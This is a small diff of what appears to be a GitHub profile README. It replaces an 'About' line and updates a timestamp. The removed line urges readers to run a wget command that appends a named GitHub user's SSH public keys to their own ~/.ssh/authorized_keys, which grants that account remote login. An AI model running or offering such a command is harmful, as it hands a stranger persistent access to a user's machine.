@@ -4,7 +4,7 @@
 
 ✨ **About**
 
-✅ Run this pls: wget -O - https://github.com/Bastiaantjuhh.keys >> ~/.ssh/authorized_keys
+⚠️ Writing code is just 20% of the job, 80% is writing Unit test, CI/CD, and fixing bugs
 
 <!--✏️ **Blog Posts**-->
 
@@ -26,4 +26,4 @@
 
 🕒 **Last Update**
 
-11-04-2025 12:35:22 UTC
+11-04-2025 16:22:16 UTC
